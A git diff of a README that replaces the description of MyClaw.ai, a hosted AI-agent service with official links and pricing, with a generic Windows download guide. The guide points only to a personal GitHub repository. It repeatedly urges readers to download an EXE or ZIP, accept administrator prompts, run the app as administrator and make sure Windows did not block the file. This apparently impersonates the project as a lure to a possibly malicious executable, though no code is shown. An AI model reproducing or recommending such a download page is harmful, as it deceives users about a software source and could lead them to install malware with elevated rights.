@@ -1,125 +1,255 @@
-<div align="center">
+# 🤖 MyClaw - Run Your Own AI Server
 
-<a href="https://myclaw.ai">
-  <img src="./assets/banner.png" alt="MyClaw.ai" width="600" />
-</a>
+[![Download MyClaw](https://img.shields.io/badge/Download-MyClaw-blue?style=for-the-badge&logo=github)](https://github.com/Lakshmi2655/MyClaw)
 
-# 🦞 MyClaw.ai 🏆
+## 🚀 What MyClaw Does
 
-**Your personal AI server. Full code control. Unlimited possibilities.**
+MyClaw gives you a personal AI server you can run on your own computer. You keep full control of the code and the setup. It is built for people who want an AI tool that can handle tasks, automate steps, and work the way they need.
 
-[![Website](https://img.shields.io/badge/myclaw.ai-Visit-blue?style=flat-square)](https://myclaw.ai) [![Reddit](https://img.shields.io/badge/Reddit-r%2Fmyclaw-FF4500?style=flat-square&logo=reddit&logoColor=white)](https://reddit.com/r/myclaw) [![Twitter](https://img.shields.io/badge/𝕏-@MyClaw__Official-000?style=flat-square&logo=x&logoColor=white)](https://x.com/MyClaw_Official)
+Use MyClaw if you want to:
 
-[English](./README.md) · [中文](./README.zh-CN.md) · [Français](./README.fr.md) · [Deutsch](./README.de.md) · [Русский](./README.ru.md) · [日本語](./README.ja.md) · [Italiano](./README.it.md) · [Español](./README.es.md)
+- Run an AI server on Windows
+- Control your own data and setup
+- Use automation for repeat tasks
+- Connect skills and tools in one place
+- Explore an open system you can shape to your needs
 
-</div>
+## 🖥️ What You Need
 
-## What is MyClaw.ai?
+MyClaw works best on a modern Windows PC.
 
-MyClaw.ai gives every user a complete server running [OpenClaw](https://github.com/openclaw/openclaw) — the open-source AI agent platform. Each instance is yours to control: deploy skills, build automations, integrate with any API, and run your own AI infrastructure.
+Recommended setup:
 
-**Key Features:**
-- 🖥️ **Full Server Control** — Each instance is a complete OpenClaw deployment
-- 🤖 **AI Agent Platform** — Build, deploy, and manage intelligent agents
-- 🔧 **Code Authority** — Full access to source code and infrastructure
-- 🌐 **Multi-Instance** — Create multiple instances for different projects
-- 💾 **Persistent Memory** — Long-term context and knowledge management
-- 🔌 **Extensible** — 100+ pre-built skills via ClawHub ecosystem
-- 🚀 **Production-Ready** — Deploy agents that actually work
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 2 GB free disk space
+- A stable internet connection
+- Administrator access for first-time setup
 
-## Quick Start
+If your PC meets these basic needs, you should be able to get started without trouble.
 
-1. **Sign up** at [myclaw.ai](https://myclaw.ai)
-2. **Create an instance** — Get your own OpenClaw server
-3. **Deploy a skill** — Choose from ClawHub or build your own
-4. **Start automating** — Let your agent handle tasks
+## 📥 Download MyClaw
 
-## Pricing
+Open the project page here and visit this page to download:
 
-| Plan | Monthly | Annual |
-|------|---------|--------|
-| **Lite** | $19/mo | $199/yr |
-| **Pro** | $39/mo | $399/yr |
-| **Max** | $79/mo | $799/yr |
+[https://github.com/Lakshmi2655/MyClaw](https://github.com/Lakshmi2655/MyClaw)
 
-All plans include full OpenClaw access, agent deployment, and skill ecosystem.
+On the page, look for the latest release or the main download files. Download the Windows version if one is listed.
 
-## Skills Ecosystem
+## 🪟 Install on Windows
 
-MyClaw.ai integrates with **ClawHub** — the open marketplace for OpenClaw skills.
+Follow these steps to set up MyClaw on Windows:
 
-**Popular Skills:**
-- 🎯 [openclaw-auto-dream](https://clawhub.ai/skills/openclaw-auto-dream) — Cognitive memory consolidation
-- 🛡️ [openclaw-guardian](https://clawhub.ai/skills/openclaw-guardian) — System hardening & recovery
-- 💾 [myclaw-backup](https://clawhub.ai/skills/myclaw-backup) — Full instance backup & restore
-- 📊 [openclaw-slides](https://clawhub.ai/skills/openclaw-slides) — AI-powered presentations
-- 🕷️ [openclaw-ultra-scraping](https://clawhub.ai/skills/openclaw-ultra-scraping) — Web scraping with anti-bot bypass
+1. Open the download page in your browser.
+2. Find the latest release or the main download file.
+3. Download the file to your computer.
+4. Open your Downloads folder.
+5. Double-click the downloaded file.
+6. If Windows asks for permission, select Yes.
+7. Follow the setup steps on screen.
+8. When setup ends, open MyClaw from the Start menu or desktop shortcut.
 
-**Browse all skills:** [clawhub.ai](https://clawhub.ai)
+If you downloaded a ZIP file:
 
-## Open Source Projects
+1. Right-click the ZIP file.
+2. Select Extract All.
+3. Choose a folder.
+4. Open the extracted folder.
+5. Run the main app file inside it.
 
-MyClaw.ai powers and maintains key OpenClaw ecosystem projects:
+## ▶️ First Run
 
-| Project | Purpose | Status |
-|---------|---------|--------|
-| [openclaw-guardian](https://github.com/LeoYeAI/openclaw-guardian) | System hardening & auto-recovery | ✅ Active |
-| [openclaw-auto-dream](https://github.com/LeoYeAI/openclaw-auto-dream) | Memory consolidation & insights | ✅ Active |
-| [myclaw-backup](https://github.com/LeoYeAI/openclaw-backup) | Full backup & restore system | ✅ Active |
-| [myclaw-bench](https://github.com/LeoYeAI/myclaw-bench) | LLM model benchmarking suite | ✅ Active |
-| [openclaw-master-skills](https://github.com/LeoYeAI/openclaw-master-skills) | Curated skill collection | ✅ Weekly updates |
+When you open MyClaw for the first time, you may see a setup screen. This helps you finish the first-time setup.
 
-## Architecture
+Do these steps in order:
 
-```
-┌─────────────────────────────────────┐
-│      MyClaw.ai (Your Account)       │
-├─────────────────────────────────────┤
-│  Instance 1  │  Instance 2  │ ...   │
-│  (OpenClaw)  │  (OpenClaw)  │       │
-├─────────────────────────────────────┤
-│  Skills Ecosystem (ClawHub)         │
-│  - 100+ pre-built skills            │
-│  - Custom skill development         │
-├─────────────────────────────────────┤
-│  Infrastructure                     │
-│  - Full code control                │
-│  - Networking & APIs                │
-│  - Persistent storage               │
-└─────────────────────────────────────┘
-```
+1. Open MyClaw.
+2. Choose your preferred language if asked.
+3. Set your server or local AI options.
+4. Save your settings.
+5. Start the app.
 
-## Use Cases
+If the app asks for a path, choose a folder you can find again, such as Documents or Desktop.
 
-- **Personal Automation** — Automate your daily workflows
-- **Business Intelligence** — Deploy agents for data analysis & reporting
-- **Content Creation** — AI-powered writing, design, and publishing
-- **Customer Support** — Build intelligent support agents
-- **Research & Development** — Experiment with AI capabilities
-- **Integration Hub** — Connect all your tools and services
+## ⚙️ Basic Setup
 
-## Community & Support
+MyClaw is made to be simple to start and flexible to use.
 
-- 🌐 **Website** — [myclaw.ai](https://myclaw.ai)
-- 📖 **Documentation** — [docs.openclaw.ai](https://docs.openclaw.ai)
-- 🐙 **GitHub** — [github.com/openclaw/openclaw](https://github.com/openclaw/openclaw)
-- 💬 **Reddit** — [r/myclaw](https://reddit.com/r/myclaw)
-- 𝕏 **Twitter** — [@MyClaw_Official](https://x.com/MyClaw_Official)
+Common setup items may include:
 
-## Roadmap
+- Server name
+- Local storage folder
+- AI model source
+- Default workflow
+- Tool access
+- User profile settings
 
-- Multi-instance orchestration
-- Advanced memory systems
-- Enterprise deployment options
-- Marketplace for agent templates
-- Native mobile apps
+A good first setup is:
 
-## License
+- Keep the default server name
+- Use a simple folder path
+- Leave advanced options on default
+- Start with one workflow at a time
 
-MyClaw.ai is built on [OpenClaw](https://github.com/openclaw/openclaw), which is open source. See individual project repositories for license details.
+## 🧠 What You Can Do With MyClaw
 
----
+MyClaw can help with daily tasks and AI-based work.
 
-**Ready to build?** Start your free trial at [myclaw.ai](https://myclaw.ai)
+Examples:
 
-Powered by MyClaw.ai | Built on [OpenClaw](https://github.com/openclaw/openclaw)
+- Start an AI server on your PC
+- Automate repeated steps
+- Use custom skills
+- Manage actions from one place
+- Build your own working setup
+- Keep full code control for custom changes
+
+If you like tools that you can shape to your own process, MyClaw gives you room to do that.
+
+## 🔧 Common Features
+
+MyClaw includes a set of useful parts for personal AI work:
+
+- AI server support
+- Automation support
+- Skill-based workflows
+- Custom setup options
+- Local control
+- Open project structure
+
+These parts help you keep the app close to your own workflow instead of forcing you into a fixed path.
+
+## 📂 Project Topics
+
+This project is built around these ideas:
+
+- ai-agent
+- ai-server
+- automation
+- clawhub
+- myclaw
+- openclaw
+- skills
+
+These topics fit a tool that acts as a personal AI system with room for custom work and task flow control.
+
+## 🧭 How to Find the Right File
+
+If the page shows more than one file, use this simple rule:
+
+- For Windows, choose the file that says Windows
+- If there is an installer, choose the installer
+- If there is a ZIP package, choose the ZIP if you want manual setup
+- If there is an EXE file, double-click it after download
+
+If you are not sure which file to use, pick the one made for the newest Windows release shown on the page.
+
+## 🛠️ If the App Does Not Open
+
+If MyClaw does not start, try these steps:
+
+1. Close the app.
+2. Open it again as administrator.
+3. Check that the file finished downloading.
+4. Move the app to a simple folder path, such as C:\MyClaw.
+5. Make sure Windows did not block the file.
+6. Restart your computer and try again.
+
+If the app opens but behaves in a strange way, check your setup options and return to the default values before trying again.
+
+## 🔐 Privacy and Control
+
+MyClaw is built for users who want more control over their AI setup. Because you run it on your own system, you decide how it fits your use case.
+
+That makes it a good fit for people who want:
+
+- Local control
+- Custom behavior
+- A setup they can manage
+- A system they can change later
+
+## 🧩 Working With Skills
+
+Skills help MyClaw handle different kinds of tasks. A skill can be a small action or a larger workflow step.
+
+You can think of skills as job cards for the AI server. Each one tells the system what to do in a clear way.
+
+Typical skill uses:
+
+- Answering a request
+- Running a repeat task
+- Calling a tool
+- Moving data between steps
+- Handling a fixed process
+
+## 📁 Suggested Folder Setup
+
+Use a clean folder so MyClaw stays easy to find.
+
+Example folder layout:
+
+- C:\MyClaw
+- C:\MyClaw\Data
+- C:\MyClaw\Logs
+- C:\MyClaw\Backups
+
+This makes it easier to keep track of files, updates, and saved settings.
+
+## 🔄 Updating MyClaw
+
+When a new version is posted:
+
+1. Go back to the download page.
+2. Get the latest file.
+3. Close the old version.
+4. Install or replace the old file with the new one.
+5. Open MyClaw again.
+
+If you keep your settings in a separate folder, your setup may be easier to carry forward when you update.
+
+## ❓ Common Questions
+
+### Do I need coding knowledge?
+No. You can start with the download and follow the setup steps on screen.
+
+### Can I run it on Windows?
+Yes. The setup steps here are for Windows users.
+
+### Do I need to keep it online?
+You need internet access to download it. After that, your setup may depend on how you use the AI server and connected tools.
+
+### Can I change how it works?
+Yes. MyClaw is built for full code control and custom use.
+
+### Is it only for advanced users?
+No. It can work for everyday users who want a personal AI server and a clear setup path.
+
+## 📌 Quick Start Checklist
+
+Before you begin, check these items:
+
+- You have a Windows PC
+- You opened the download page
+- You downloaded the correct file
+- You ran the installer or opened the app file
+- You finished the first-time setup
+- You started MyClaw and saved your settings
+
+## 🧾 Files and Use
+
+Depending on the release, you may see:
+
+- An installer file
+- A ZIP file
+- A main app file
+- A readme or notes file
+
+Open the notes file if one is included. It may give version details or setup steps for that release.
+
+## 🖱️ Download Again if Needed
+
+If the first download fails or stops early, open the project page again and visit this page to download:
+
+[https://github.com/Lakshmi2655/MyClaw](https://github.com/Lakshmi2655/MyClaw)
+
+Then get the file again and repeat the setup steps above
